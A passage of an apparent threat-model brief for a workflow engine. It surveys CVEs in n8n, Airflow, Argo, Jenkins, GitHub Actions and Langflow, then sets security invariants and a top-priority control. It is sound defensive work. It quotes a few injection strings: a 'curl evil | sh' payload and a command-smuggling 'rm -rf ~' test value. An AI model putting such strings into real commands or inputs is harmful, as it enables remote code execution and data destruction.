# BL-097 Pass E — Security Posture for a Full Workflow Engine at V1

**Date:** 2026-04-22
**Question:** AI Sidekicks V1 is shipping the full workflow engine (Option 6 in the BL-097 scope debate). Workflow definitions become execution, authors may not equal operators, `human` phases accept uploads, `automated` phases handle secrets. What is the security attack surface, what invariants must the V1 contract enforce, and what is the single highest-priority defensive control for initial implementation?
**Audience:** Threat-model addendum authors and Spec-017 rewrite owner. Every non-trivial claim is cited; inference is explicitly marked.

---

## 1. Problem Framing

### 1.1 What changes in V1 vs a simpler design

A full workflow engine in V1 carries four architectural shifts that each expand attack surface:

1. **Workflow definitions are data that becomes execution.** A YAML or JSON file authored outside the security boundary drives process spawning, HTTP calls, and filesystem writes. This is the exact pattern that produced Apache Airflow `CVE-2024-39877` (Jinja2 injection via `doc_md`), n8n `CVE-2025-68613` (expression-injection RCE, CVSS 9.9), and Langflow `CVE-2025-3248` (unauthenticated `/api/v1/validate/code` RCE, CVSS 9.8). All three are workflow engines where definition-parsing and execution-dispatch were insufficiently separated.
2. **Author ≠ operator.** In single-user local tools the person writing the workflow is the person running it. In V1 (multi-user, shared channels, cross-machine collab per Spec-016), a workflow authored by User A may execute on User B's daemon with User B's credentials. This mirrors the GitHub Actions threat model where fork-PR authors can influence workflows that run with base-repo privileges — the source of the `pull_request_target` class (Microsoft's own `CVE-2025-61671`, CVSS 9.3) and the entire `pwn_request` vulnerability category (GitHub Security Lab).
3. **`human` phases accept untrusted uploads.** Any file-accepting step inherits the full OWASP File Upload threat model: content-type spoofing, AV/CDR requirements, webroot isolation, path-traversal in storage keys.
4. **`automated` phases handle secrets.** Secrets in env, secrets interpolated into command lines, secrets possibly ending up in logs or artifacts. Airflow's issue `apache/airflow#54540` (2025) documents that even a project with multi-year investment in a Secret Masker still has bypass cases — this is a class of defense-in-depth requirement, not a "turn it on" feature.

### 1.2 Threat-actor model this brief assumes

Three actors are in scope for V1. In declining order of privilege:

- **Malicious insider with authoring rights.** Can submit a workflow definition. The highest-frequency real-world threat class per OWASP CI/CD Top 10: `CICD-SEC-4` Poisoned Pipeline Execution and `CICD-SEC-1` Insufficient Flow Control.
- **Compromised-dependency attacker.** Pushes a malicious version of a tool the workflow calls (analog of the `tj-actions/changed-files` supply-chain compromise, `CVE-2025-30066`, which exfiltrated secrets from 23,000 repos in March 2025).
- **Opportunistic attacker with approver role on some phase.** Seeks to abuse granted approval scope to approve phases outside their authority — the class Jenkins has been unable to solve cleanly (`JENKINS-27134`, no granular "approve flow" permission; default submitter check requires only Read).

Out of scope for this pass: physical access to the operator's machine, OS-level compromise, Electron-main RCE. Those classes exist but are orthogonal to workflow-engine scope decisions.

### 1.3 Non-decisions

- **Running workflows in a VM or container sandbox.** Spec-005 already constrains execution to the operator's workstation; V1 does not ship a sandboxing layer. This brief treats sandboxing as out-of-scope and focuses on in-process defenses (parameter typing, argv-list execution, parse-time validation).
- **Multi-tenant server deployment.** V1 is local daemon + local Electron; the "tenant" is the operator. Cross-machine collab (Spec-016) uses explicit channel primitives rather than shared execution.

The live question is: given that V1 has no sandbox, what must the workflow-engine contract enforce at parse-time and execute-time to make the surface defensible?

---

## 2. Landscape — Workflow-Engine Security in 2024–2026

### 2.1 OWASP CI/CD Top 10 (2022, still authoritative)

The ten risk IDs, in priority order, from `owasp.org/www-project-top-10-ci-cd-security-risks/`:

| ID | Name | Relevance to V1 workflow engine |
|---|---|---|
| CICD-SEC-1 | Insufficient Flow Control Mechanisms | Direct — workflow author can trigger `automated` phase that acts on resources they don't own. |
| CICD-SEC-2 | Inadequate Identity and Access Management | Direct — workflow author vs approver vs operator permission separation. |
| CICD-SEC-3 | Dependency Chain Abuse | Direct — any `automated` phase that runs `npm install`, `pip install`, or a CLI tool update. |
| CICD-SEC-4 | Poisoned Pipeline Execution (PPE) | Highest-severity direct — workflow definition *is* the pipeline config; whoever can edit it can execute. |
| CICD-SEC-5 | Insufficient Pipeline-Based Access Controls (PBAC) | Direct — blast-radius containment between phases. |
| CICD-SEC-6 | Insufficient Credential Hygiene | Direct — secrets in env vs in argv vs in logs vs in artifacts. |
| CICD-SEC-7 | Insecure System Configuration | Medium — V1 has few knobs to get wrong; grows in V1.1+. |
| CICD-SEC-8 | Ungoverned Usage of 3rd Party Services | Medium — whatever the workflow invokes externally (`gh`, `aws`, `curl`). |
| CICD-SEC-9 | Improper Artifact Integrity Validation | Medium — Argo `CVE-2025-66626` is the canonical example (symlink traversal in artifact extraction). |
| CICD-SEC-10 | Insufficient Logging and Visibility | Medium — approval history is security-critical audit trail. |

Inference (marked): `CICD-SEC-4`, `CICD-SEC-5`, and `CICD-SEC-6` are the three that map most directly to the four architectural shifts in §1.1, and they are where the primary CVEs below cluster.

### 2.2 CVE evidence table — 2023–2026 workflow-engine CVEs

| System | CVE | Year | Class | CVSS | Lesson for AI Sidekicks |
|---|---|---|---|---|---|
| **n8n** | `CVE-2025-68613` | 2025 | Expression-injection RCE → sandbox escape | 9.9 | Authenticated workflow author escaped expression sandbox via crafted JS; authored workflow is *always* RCE-equivalent unless parse-time validation is total. 103,476 exposed instances at disclosure. |
| **Airflow** | `CVE-2024-39877` | 2024 | Jinja2 template injection via `doc_md` → code execution in scheduler context | High | DAG-author RCE through a *documentation* field. Every string field the engine renders is a potential expression evaluator. |
| **Airflow** | `CVE-2024-56373` | 2024 | RCE via log-template history in web-server context | High | Unsanitized DB-stored author input rendered in a second context = privilege escalation. |
| **Airflow** | `CVE-2025-54550` | 2025 | RCE via XCom race condition (example DAG) | Low | Race in inter-phase data passing. Low because UI users are already trusted — but the *pattern* (untrusted XCom content becomes code) is the one that matters. |
| **Airflow** | `CVE-2025-67895` | 2025 | Edge3 provider non-public API → DAG-author RCE in webserver context | High | Non-public APIs are not a security boundary. |
| **Argo Workflows** | `CVE-2025-66626` | 2025 | Symlink-traversal RCE in artifact extraction (broken fix for `CVE-2025-62156`) | High | Path-validation fixes regularly have follow-on bypasses; assume archive extraction is unsafe by default. |
| **Argo Workflows** | `CVE-2024-53862` | 2024 | Authentication bypass on archived-workflow GET endpoint (client-auth mode) | High | Auth regressions land silently between minor versions when code paths are not unified. |
| **Argo Workflows** | `CVE-2024-47827` | 2024 | DoS via race on global variable in daemon workflows | Medium | Any user with execute → controller crash. Shared global state is a liability. |
| **GitHub Actions** | `CVE-2025-30066` (tj-actions/changed-files) | 2025 | Supply-chain compromise; action retroactively re-tagged to malicious commit; ran script that dumped runner memory (secrets) to public logs | High | Trust in mutable tags is misplaced; 23,000 repos compromised. If V1 references external tools by mutable name (not content hash), same class applies. |
| **GitHub Actions** | `CVE-2025-61671` (pull_request_target class) | 2025 | Workflows with `pull_request_target` + checkout of fork code ran untrusted code with base-repo privileges | 9.3 | Fix shipped 2025-11-07: workflow source now always resolved from default branch for these triggers. Author ≠ operator is the underlying sin. |
| **Jenkins Script Security** | `CVE-2024-34144` | 2024 | Sandbox bypass via crafted constructor bodies (implicit casts) | High | Sandboxes built on language features have a long tail of bypasses. |
| **Jenkins Script Security** | `CVE-2024-34145` | 2024 | Sandbox bypass via sandbox-defined Groovy classes shadowing non-sandbox classes | High | Same class: in-process sandboxing is not a durable boundary. |
| **Langflow** | `CVE-2025-3248` | 2025 | Unauthenticated RCE via `/api/v1/validate/code` endpoint using `exec()` on Python default args/decorators | 9.8 | Actively exploited in the wild (Flodric botnet). "Validation" endpoints that call `exec` are the most direct engine-as-RCE pattern. |
| **Langflow** | `CVE-2025-34291` | 2025 | Chained CORS + missing CSRF + code-validation endpoint → account takeover + RCE by visiting a malicious page | 9.4 | Web-surface misconfiguration compounds with engine's code-exec features into 0-click RCE. If V1 ships any web/renderer surface, same chaining applies. |
| **Prefect** | `CVE-2024-8183` | 2024 | CORS misconfiguration → unauthorized data access pre-3.0.3 | Medium | Defaults matter. CORS wide-open-by-default is a recurring workflow-engine bug. |
| **CircleCI** | N/A (2023 breach, no CVE; token exfiltration via compromised engineer endpoint) | 2023 | Customer secrets exfiltrated from CircleCI databases | N/A | Secrets stored server-side mean a vendor breach rotates customer secrets. V1's local-first posture avoids this specific class — but only if secrets never leave the operator's machine unencrypted. |
| **GitHub Actions (cache)** | Cache poisoning technique (Khan, 2024; weaponized as "Cacheract") | 2024 | Workflow with RCE in main branch can write to Actions cache; later runs restore poisoned cache | N/A | Shared caches across runs are a lateral-movement channel. V1 should treat any cache across workflow runs as untrusted input. |

### 2.3 Engine-specific architecture comparisons

**Temporal — the maturity benchmark for secrets and authorization.** From `docs.temporal.io/production-deployment/data-encryption` and `/cloud/security`:

- **Payload Codec pattern:** Data Converter serializes workflow state; Payload Codec is an optional layer that encrypts *before* the payload reaches the Temporal Server. The server never sees plaintext. Keys stay with the client.
- **Codec Server:** HTTPS service independent of Temporal Server. When operators (e.g., the Temporal Web UI) need to view decrypted history, UI forwards a JWT; Codec Server enforces authorization and decrypts. This is the closest industry model for "server can't leak what it can't decrypt."
- **mTLS + API keys per namespace:** per-namespace X.509 certs or scoped API keys. No shared server-wide credentials.
- **Determinism requirement:** Temporal workflows must be deterministic — replay validates Commands against Event History. Non-determinism throws at replay time. Inference: replay-based execution means mutations and I/O must be isolated in Activities; a security corollary is that *every external side effect has an explicit audit trail* in the Event History.
- **Signals and queries:** Signals mutate state asynchronously; the search I ran did not find a CVE class for signal injection, but the forum discussion `community.temporal.io/t/preliminary-investigation-into-idempotent-signals/13694` shows idempotent-signal design is still an open area of the platform. Inference: signal handlers that aren't idempotent are a replay-safety bug that can also be a security-relevant replay-amplification bug.

**Airflow — the pattern-based masker is a cautionary tale.** From `airflow.apache.org/docs/apache-airflow/stable/security/secrets/mask-sensitive-values.html` and issue `apache/airflow#54540`:

- Masker operates on *log write*: any known-sensitive value seen flowing through `log` or `render` is replaced with `***`. It hooks common field names (`password`, `api_key`, `secret`, `token`, `authorization`).
- Known bypasses: values transformed (base64, JSON.stringify, split across tokens) escape the matcher. Issue `#54540` reports "Secret masker often doesn't always mask values" — in Airflow 3.0.0–3.0.4 the masker shipped broken.
- Lesson for V1: **pattern-based post-hoc masking is a partial defense, not a primary control.** The primary control is keep secrets out of env/argv/logs in the first place (structured secret references that resolve at the last moment, never appear in the command line).

**Argo Workflows — the symlink-extraction class is recurring.** `CVE-2025-66626` is specifically notable because it was a *broken fix* for the prior `CVE-2025-62156`. Inference: any archive-extraction code path in V1 (if we ship one for `human` uploads) must treat even a patched validator as provisional and add redundant checks (resolve every path after extraction; reject if it escapes the intended root).

**Jenkins — the approval model is where V1 should NOT copy.** From `jenkins.io/doc/pipeline/steps/pipeline-input-step/`:

- Default behavior: *any user who can Read the workflow build page can approve the `input` step.* Only `Read` is required.
- Explicit submitter list: `input(submitter: "alice,bob")` — but this is enforced at approval-time only, and Jenkins admins (`Overall/Administer`) bypass it.
- Users with `Job/Cancel` can always respond with `Abort`.
- Proposed-but-not-implemented: a dedicated `Job/Approve` permission (`JENKINS-27134`). As of the sources fetched, it's still a request, not a feature.
- Anonymous approval bug class: `JENKINS-33793` (anonymous GET endpoint for `input` step approval) demonstrates the approval-dispatch pipeline itself has had auth bypasses.

Lesson for V1: **ship approval as a typed permission from day one, not as a submitter string.** Submitter strings are trivially forgeable if the enforcement runs in-process and can be bypassed by anyone with admin.

**GitHub Actions script injection — the canonical shell-interpolation failure.** From `docs.github.com/en/actions/concepts/security/script-injections`:

- `${{ github.event.issue.title }}` inside a `run:` block interpolates *before* shell execution. An issue title of `a"; curl evil | sh #` becomes part of the shell command line.
- Recommended fix: set the interpolated value as an environment variable, then reference `$TITLE` from the script. The env-var boundary preserves the quote discipline the shell would otherwise destroy.
- This is the single most common CI/CD vulnerability pattern of 2024–2025. n8n `CVE-2025-68613`, Airflow `CVE-2024-39877`, and GitHub Actions script injection are the same *category* — an engine's template/expression evaluator handing attacker-controlled strings to a downstream interpreter.

### 2.4 OWASP File Upload guidance (applicable to `human` phases)

From `cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html`:

- **Extension allowlist only** (not denylist; not Content-Type header trust).
- **File-type validation via content sniffing** (magic bytes), not the client-provided MIME.
- **Rename at storage** to application-generated names; drop the original extension until after validation.
- **Size cap** enforced before parse.
- **Store outside webroot** (for V1: outside any path that HTTP or the Electron renderer can read).
- **AV/CDR scan** for applicable types; ASVS issue `OWASP/ASVS#679` documents the ongoing debate about whether AV is mandatory or recommended — current guidance is "run through AV/sandbox if available; apply CDR to PDF/DOCX".
- **Path-traversal prevention** on storage keys.
- **Quarantine** for anything that fails any check.

---

## 3. Threat Categories — Applied to V1 Full Workflow Engine

Five categories, each mapped to CVEs from §2.2 and to the four architectural shifts from §1.1. In descending severity order.

### 3.1 Category A — Workflow-definition injection (definitions become shell/code)

**What it is:** An author-controlled string ends up as executable code. Three sub-patterns, all represented in the CVE table:

- **A1 — Expression sandbox escape.** n8n `CVE-2025-68613`: JS expression in a workflow field evaluated in a "sandbox" that leaks to host JS context. Langflow `CVE-2025-3248`: `exec()` on Python with author-controlled default args/decorators. Jenkins `CVE-2024-34144` / `CVE-2024-34145`: Groovy sandbox escapes via subclassing tricks.
- **A2 — Template injection.** Airflow `CVE-2024-39877` (`doc_md` Jinja2). Any field the engine renders with a template engine is a second execution surface.
- **A3 — Shell-string interpolation.** GitHub Actions `${{ github.event.* }}` in `run:`. Attacker-controlled content ends up between quotes in a command line. Classic command injection.

**Mapped OWASP:** `CICD-SEC-4` (PPE — this *is* the definition of poisoned-pipeline-by-author).

**Blast radius:** RCE on the daemon host with daemon privileges. In V1 the daemon runs as the operator, so this is full operator-account RCE.

### 3.2 Category B — Author ≠ operator privilege confusion

**What it is:** User A authors a workflow; User B approves or executes it; the engine applies User B's credentials, secrets, and authority to code User A wrote.

- **B1 — Fork-PR-style cross-user execution.** GitHub Actions `pull_request_target` class (`CVE-2025-61671`). A workflow file checked out of a fork runs in base-repo context. V1 analog: a workflow shared via a Spec-016 channel is executed on another operator's daemon with that operator's secrets.
- **B2 — Approval-permission escalation.** Jenkins `input` default: anyone with `Read` approves. `JENKINS-27134` still open. V1 analog: any approver can approve any phase, including phases that gate side effects the approver has no authority over.
- **B3 — Approval-history tampering.** If approval records live in the same store as the workflow definition, an authoring action can rewrite history. No single cited CVE, but inferred from `CICD-SEC-10` (Insufficient Logging).

**Mapped OWASP:** `CICD-SEC-2` (IAM), `CICD-SEC-5` (PBAC).

**Blast radius:** full operator-account authority used by a party who never proved identity.

### 3.3 Category C — Secrets leakage through env, argv, logs, artifacts

**What it is:** Secrets that should stay server-side or key-store-side show up in places they shouldn't.

- **C1 — Env-var leakage to logs/artifacts.** `tj-actions/changed-files` `CVE-2025-30066` dumped runner-process memory to public workflow logs. Any V1 `automated` phase that captures process stdout into an artifact is the same class.
- **C2 — Argv leakage via process lists / crash dumps.** Secrets in `argv` show up in `ps`, in core dumps, in Linux `/proc/*/cmdline`. A long-standing best practice is to never pass secrets as argv, only as env or stdin or file descriptor.
- **C3 — Masking bypass via transformation.** Airflow's pattern-based masker fails when the value is base64'd, split, or re-encoded (issue `apache/airflow#54540`). Post-hoc masking is defense-in-depth, not primary.
- **C4 — Server-side secret storage breach.** CircleCI 2023 incident: vendor compromise rotates every customer secret. V1's local-first posture reduces this class — but only if the daemon's secret store is encrypted at rest and cross-machine sync (Spec-016) never transports secrets.

**Mapped OWASP:** `CICD-SEC-6` (Credential Hygiene), `CICD-SEC-10` (Logging).

**Blast radius:** secrets that grant access to the operator's downstream services (GitHub, cloud, LLM APIs).

### 3.4 Category D — `human` phase file-upload handling

**What it is:** Untrusted bytes arriving through a `human` phase upload. Full OWASP File Upload threat model applies.

- **D1 — Malicious content** (executables, exploit PDFs, office-macro bombs). Mitigation: extension allowlist, size cap, AV/CDR scan, quarantine on fail.
- **D2 — Content-type spoofing.** Client says `image/png`; bytes are a shell script. Mitigation: server-side magic-byte sniff, never trust Content-Type.
- **D3 — Path traversal in storage keys.** Upload name `../../../../daemon.sock`. Argo `CVE-2025-66626` and its predecessor `CVE-2025-62156` are the canonical symlink-extraction class — even *patched* extraction code has follow-up bypasses.
- **D4 — Webroot exposure.** Uploaded content accessible via the Electron renderer or an HTTP endpoint. Mitigation: store outside any served path; serve via a content-type-enforced endpoint that sets `Content-Disposition: attachment`.

**Mapped OWASP:** `CICD-SEC-9` (Artifact Integrity) — plus direct ties to OWASP File Upload Cheat Sheet and ASVS V12.

**Blast radius:** malicious upload → daemon-host compromise (if parsed unsafely) or client-side compromise (if served back to another user).

### 3.5 Category E — Dependency and tooling supply chain

**What it is:** The workflow `automated` phase invokes external tools (e.g., `gh`, `aws`, `codex`, `claude`) or installs packages. Each is a transitive dependency whose supply chain intersects V1's trust boundary.

- **E1 — Malicious tool version.** `tj-actions/changed-files` compromise: mutable tag re-pointed to malicious commit. V1 analog: any tool referenced by name or version-range without content-address verification is the same class.
- **E2 — Post-install script exec.** `npm install` runs arbitrary code. If a workflow phase calls `npm install` as part of its flow, install-time RCE is in the daemon's trust boundary.
- **E3 — Cache poisoning.** Khan's 2024 GitHub Actions technique: a workflow with prior RCE poisons a cache that is later restored by an un-RCE'd workflow. V1 analog: any cross-run cache without per-run isolation allows this.

**Mapped OWASP:** `CICD-SEC-3` (Dependency Chain Abuse), `CICD-SEC-8` (3rd-Party Services).

**Blast radius:** equivalent to Category A (RCE on daemon) but arrives via a dependency update that could be months after the workflow was authored.

---

## 4. V1 Security Invariants (Testable Assertions)

These are stated as testable contract requirements the V1 implementation must enforce, not as aspirations. Seven invariants. If any one is violated, the corresponding threat class becomes live.

### 4.1 Invariant I1 — argv-list-only execution; no shell-string command form, ever

**Statement:** Every `automated` phase invokes an external process via an argv-list (equivalent of `subprocess.run([...], shell=False)` or `execv` family). **No code path in V1 ever constructs a shell command as a single string and hands it to `/bin/sh -c`.** No workflow-definition field is rendered directly into a command string; parameters are always passed as typed argv elements after the command.

**Why:** Closes GitHub Actions script-injection class (Category A3) at the architecture level. Attacker-controlled strings end up as argv[N], where shell quoting/escaping is irrelevant because the shell is never invoked.

**Test:** Grep the codebase for `shell=True`, `subprocess.Popen(..., shell=True)`, `child_process.exec` (uses shell), or any template that renders into a shell command. Golden-path test: feed a workflow whose parameter value is `"; rm -rf ~ #` and assert (a) it runs, (b) it doesn't delete anything.

**Source:** `securelayer7.net/cve-2024-39877`, `docs.github.com/en/actions/concepts/security/script-injections`, `semgrep.dev/docs/cheat-sheets/python-command-injection`.

### 4.2 Invariant I2 — typed parameter substitution; no templating over workflow fields

**Statement:** Workflow-definition fields that carry user data are substituted into phase inputs via a typed, structure-preserving mechanism (e.g., bind parameters), never via string templating (no Jinja2, no `${...}`, no `{{ }}` over author-controlled fields). If V1 needs any templating for convenience (e.g., referencing prior-phase output), the allowed expression grammar is a closed, non-Turing-complete lookup language parsed with a whitelist, not an eval.

**Why:** Closes Category A1 (expression sandbox escape) and A2 (template injection). Every CVE in §2.2 that mentions "expression" or "Jinja2" or "exec" traces to an engine that chose to be too expressive.

**Test:** Static: the parser's grammar is published and enforced. Dynamic: fuzz the expression grammar; every attempt to break out must return a parse error, never an eval.

**Source:** `n8n-io/n8n/security/advisories/GHSA-v98v-ff95-f3cp`, Airflow `CVE-2024-39877`, Jenkins `CVE-2024-34144` / `-34145`.

### 4.3 Invariant I3 — approver permission is a typed capability, not a submitter string

**Statement:** For every `human` phase that gates execution (approval), the engine records a typed `approver-identity → phase-id` capability. Approval is valid only if the approver's identity matches a capability; admin override *is itself a distinct capability* that is logged and cannot be silently exercised. The phase's allowed-approver set is defined at workflow-authoring time and cannot be mutated without a re-authoring audit event.

**Why:** Closes Category B2 (approval-permission escalation). Jenkins's submitter-string model and its admin-bypass are the anti-pattern.

**Test:** Given workflow W with phase P requiring approver Alice: assert Bob cannot approve P even if Bob has admin. Admin override must emit an audit event distinguishable from normal approval.

**Source:** `jenkins.io/doc/pipeline/steps/pipeline-input-step/`, `JENKINS-27134`.

### 4.4 Invariant I4 — secrets never appear in argv, logs, or artifact bytes at rest

**Statement:** Secrets are addressed by reference (opaque token, e.g., `secret://<scope>/<name>`) in workflow definitions and phase specifications. Resolution happens at phase-launch time, inside the daemon, into a stream that goes to the child process's env, stdin, or a named-file fd — **never into argv**. The daemon's logging layer redacts any occurrence of a resolved secret bytes in log output before write (defense-in-depth, layered *on top of* the primary never-in-argv rule). Artifacts produced by a phase are not uploaded/synced without a scanner pass that detects secret patterns.

**Why:** Closes Category C1, C2, C3. This is the Temporal Payload Codec + "secrets out of argv" best practice, combined with Airflow's secret-masker lesson that post-hoc masking is partial.

**Test:** Run a phase with a known canary secret; `ps auxww` during execution must not contain the secret; logs must not contain the secret; artifact dump must not contain the secret; any crash-dump path must not contain the secret.

**Source:** `docs.temporal.io/production-deployment/data-encryption`, `airflow.apache.org/docs/apache-airflow/stable/security/secrets/mask-sensitive-values.html`, `apache/airflow#54540`, `CVE-2025-30066`.

### 4.5 Invariant I5 — workflow definitions are content-addressed and signed; mutable tags not trusted

**Statement:** A workflow definition referenced from outside the operator's machine (e.g., a shared template, a channel-delivered workflow per Spec-016) is identified by a content hash, not a mutable name. Before execution, the daemon verifies the hash and a signature (or, at V1 minimum, a hash). If a workflow references external tools at specific versions, those versions are recorded and validated at execute time (e.g., `codex@v1.2.3#sha256=...`).

**Why:** Closes Category E1 (malicious tool version) and the general `tj-actions` supply-chain class. V1 does not need its own signing infrastructure; a hash pin on everything shared across the operator boundary is the minimum viable version.

**Test:** Modify the referenced definition after the pin; execution must fail closed, not quietly pick up the change.

**Source:** `CVE-2025-30066`, OpenSSF guidance at `openssf.org/blog/2024/08/12/mitigating-attack-vectors-in-github-workflows/`.

### 4.6 Invariant I6 — `human` phase uploads follow OWASP File Upload minimums

**Statement:** Any file received through a `human` phase:

1. Size cap enforced pre-parse.
2. Extension on an explicit allowlist.
3. Content-type validated by magic-byte sniff (not Content-Type header).
4. Stored under a daemon-generated name, in a directory outside any served path.
5. Path-validated post-write (resolve; reject if outside intended root).
6. AV scan hook present (may be a no-op in V1 if no AV is configured, but the hook must exist so enterprise operators can wire it up without engine changes).
7. On any check failure, file is quarantined (moved to a non-executable path) and phase fails.

**Why:** Closes Category D. OWASP File Upload Cheat Sheet defines this; ASVS V12 formalizes.

**Test:** Upload test fixtures (zip bomb, polyglot PNG+shell-script, symlink-to-/etc/passwd). Each must be rejected.

**Source:** `cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html`, `owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload`, `CVE-2025-66626`.

### 4.7 Invariant I7 — approval history is append-only and tamper-evident

**Statement:** Every approval decision (grant, deny, admin override, timeout) is written to an append-only log with a prior-entry hash chain. Workflow-definition edits are a separate audit entry; approving-a-phase cannot be re-interpreted as a different phase by editing the definition after approval. Replays of a completed workflow use the committed approval history, not a re-derivation from the current definition.

**Why:** Closes Category B3 (approval-history tampering) and the replay-attack class. Temporal's Event History is the reference pattern — every state change is recorded, and replays validate against that history.

**Test:** Given an approved workflow, edit the workflow definition to change phase P's approver requirement after approval; replaying the workflow must use the *at-time-of-approval* policy, not the edited one.

**Source:** `docs.temporal.io/workflow-execution` (Event History model), `CICD-SEC-10` (OWASP Logging).

---

## 5. Highest-Priority Defensive Control for Initial Implementation

### 5.1 Pick: Invariant I1 + I2 together — argv-list execution with typed parameter substitution, enforced at the engine core, with no shell-string path anywhere in the codebase.

**Why this one above the others:**

1. **It is the control that cannot be retrofitted.** If V1 ships with shell-string templating anywhere in the execution path, every later hardening pass fights the architecture. The n8n, Airflow, Langflow CVEs in §2.2 are all *post-hoc* attempts to fix an engine that baked expression-evaluation into its data model. The V1 moment is the only moment where this is cheap.
2. **It is the single shared root of the three highest-severity CVE classes of 2024–2026 in the engine space:** n8n `CVE-2025-68613` (expression escape), Airflow `CVE-2024-39877` (template injection), GitHub Actions script-injection class. Closing it closes three attack families with one contract.
3. **It is implementable with low churn.** Enforce "no shell" via a wrapper primitive that all phase-launch code paths must call; static-analysis gate in CI greps for `shell=True`, `exec(`, backtick-exec, etc. The wrapper primitive is perhaps 50 lines. The grammar for parameter substitution is a closed whitelist (no user-facing eval).
4. **The other invariants depend on it.** I4 (secrets not in argv) is enforceable only if you control how argv is constructed. I3 (approval as typed capability) is enforceable only if phase inputs are typed. Starting from I1+I2 makes I3–I7 incrementally composable; starting from the top of the stack and hoping to retrofit argv discipline later is the path that produces n8n-class engines.

**Second-priority control** (called out so it's not lost): **I4 (secrets-by-reference, never in argv)** — same architectural-moment argument. If secrets can be embedded as literal strings in workflow fields, every secret-handling hardening after V1 is chasing leak sites.

**Trade-off accepted:** I1+I2 forbid a class of *convenience* — users who want "just run this bash snippet with values interpolated in" will need to either (a) use a typed, limited interpolation grammar or (b) accept that their snippet is a typed argv invocation of `bash -c` where the argv[1] is not user-templated. This will feel clunky at the edge. That cost is worth paying; every engine that paid the opposite trade-off (n8n, Airflow, Jenkins, Langflow) is in §2.2.

### 5.2 What the V1 contract documentation must say

Explicit language in Spec-017 (or its successor):

> The workflow engine does not evaluate expressions over workflow fields. Parameter substitution is typed and structure-preserving: a field of type `string` produces a string argv element; a field of type `file` produces a path argv element; a field of type `secret` is resolved at phase-launch time and produced through env or stdin, never argv. No shell is ever spawned with a user-interpolated command string. Engine implementations that violate this contract are non-conformant.

The phrasing "non-conformant" is load-bearing — it puts any future "just add a little templating" request on the wrong side of a versioned contract, not of a preference.

---

## 6. Tripwires — Signals That the Posture Is Failing

Post-V1, the following signals should trigger escalation to Category A or C (definition-injection or secret-leak) incident response:

1. **Any V1 bug that allows a workflow field to reach a shell.** Even if it's a "harmless" convenience feature. This is a category-wide regression.
2. **Approval flow that falls back to admin-bypass when the approver capability check fails.** The Jenkins anti-pattern.
3. **Secrets observed in logs, crash dumps, or `ps` output during a supported phase.** Masking fallback, not primary control, would be in play — which means I4 is being violated somewhere.
4. **External workflow references without hash pins** resolving successfully in production.
5. **Replays of completed workflows that evaluate the current definition** rather than the at-execution-time definition. Indicates missing append-only history.

---

## 7. Inference Markers

Explicit places this brief goes beyond primary sources:

- **Inference (marked):** §2.3 Temporal signal-idempotency is a security concern as well as a correctness concern. The docs treat it as correctness; I'm asserting the security framing based on general principles, not a cited Temporal security doc.
- **Inference (marked):** §3.2 B3 (approval-history tampering) does not have a single cited CVE in the systems surveyed; it's derived from OWASP `CICD-SEC-10` plus the observation that Jenkins's input-step approval records are co-located with build metadata.
- **Inference (marked):** §5.1 "n8n, Airflow, Langflow CVEs are all post-hoc attempts to fix an engine that baked expression-evaluation into its data model" is my characterization of a pattern, not a quote from a maintainer post-mortem. The underlying CVEs are primary; the pattern-labeling is mine.
- **Inference (marked):** §3.5 E2 "npm install runs arbitrary code" is well-known ecosystem knowledge; I did not cite a specific 2024–2026 CVE for it because the class is long pre-dating the search window.

Inferences are marked so the threat-model addendum authors can choose to verify or downgrade them independently.

---

## 8. Sources

All fetched 2026-04-22.

**OWASP and foundational:**
- OWASP Top 10 CI/CD Security Risks — `https://owasp.org/www-project-top-10-ci-cd-security-risks/`
- CICD-SEC-1 Insufficient Flow Control — `https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-01-Insufficient-Flow-Control-Mechanisms`
- CICD-SEC-7 Insecure System Configuration — `https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-07-Insecure-System-Configuration`
- CICD-SEC-10 Insufficient Logging — `https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-10-Insufficient-Logging-And-Visibility`
- OWASP CI/CD Security Cheat Sheet — `https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html`
- OWASP File Upload Cheat Sheet — `https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html`
- OWASP Unrestricted File Upload — `https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload`
- OWASP WSTG — Upload of Malicious Files — `https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files`
- OWASP ASVS Issue #679 (antivirus on upload) — `https://github.com/OWASP/ASVS/issues/679`
- OpenSSF — Mitigating Attack Vectors in GitHub Workflows — `https://openssf.org/blog/2024/08/12/mitigating-attack-vectors-in-github-workflows/`

**n8n:**
- n8n `CVE-2025-68613` (RCE via expression injection) — `https://github.com/n8n-io/n8n/security/advisories/GHSA-v98v-ff95-f3cp`
- Resecurity analysis — `https://www.resecurity.com/blog/article/cve-2025-68613-remote-code-execution-via-expression-injection-in-n8n-2`
- Orca Security write-up — `https://orca.security/resources/blog/cve-2025-68613-n8n-rce-vulnerability/`
- The Hacker News (scope, CVSS) — `https://thehackernews.com/2025/12/critical-n8n-flaw-cvss-99-enables.html`
- Upwind — six n8n CVEs one day — `https://www.upwind.io/feed/six-n8n-cves-one-day-workflow-security`

**Airflow:**
- Airflow `CVE-2024-39877` (doc_md Jinja2) — `https://blog.securelayer7.net/arbitrary-code-execution-in-apache-airflow/`
- Airflow `CVE-2024-56373` (log template RCE) — `https://www.sentinelone.com/vulnerability-database/cve-2024-56373/`
- Airflow `CVE-2025-54550` (XCom example_dag) — `https://advisories.gitlab.com/pypi/apache-airflow/CVE-2025-54550/`
- Airflow `CVE-2025-67895` (Edge3 provider RCE) — `https://www.wiz.io/vulnerability-database/cve/cve-2025-67895`
- Airflow secret masker docs — `https://airflow.apache.org/docs/apache-airflow/stable/security/secrets/mask-sensitive-values.html`
- Airflow Fernet secrets — `https://airflow.apache.org/docs/apache-airflow/stable/security/secrets/fernet.html`
- Airflow masker bug `#54540` — `https://github.com/apache/airflow/issues/54540`

**Argo Workflows:**
